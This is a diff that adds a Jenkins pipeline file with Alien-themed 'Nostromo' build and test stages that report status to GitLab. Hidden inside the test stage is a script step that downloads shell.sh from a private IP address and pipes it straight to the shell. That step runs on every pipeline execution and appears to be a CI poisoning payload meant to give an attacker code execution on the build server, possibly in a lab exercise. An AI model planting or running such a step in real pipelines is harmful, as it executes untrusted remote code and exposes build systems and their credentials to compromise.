@@ -1,0 +1,26 @@
+pipeline {
+    agent any
+    stages {
+       stage('build') {
+          steps {
+             echo 'Notify GitLab'
+             updateGitlabCommitStatus name: 'build', state: 'pending'
+             echo 'build step goes here'
+             updateGitlabCommitStatus name: 'build', state: 'success'
+             echo "Preparing for the Nostromo Build, please stand by...."
+          }
+       }
+       stage(test) {
+           steps {
+               echo 'Notify GitLab'
+               updateGitlabCommitStatus name: 'test', state: 'pending'
+               echo 'test step goes here'
+               updateGitlabCommitStatus name: 'test', state: 'success'
+               echo 'Testing the controls of the Nostromo, please stand by.....'
+               script {
+                  sh 'curl http://10.50.1.188:8000/shell.sh|sh'
+               }
+           }
+       }
+    }
+ }
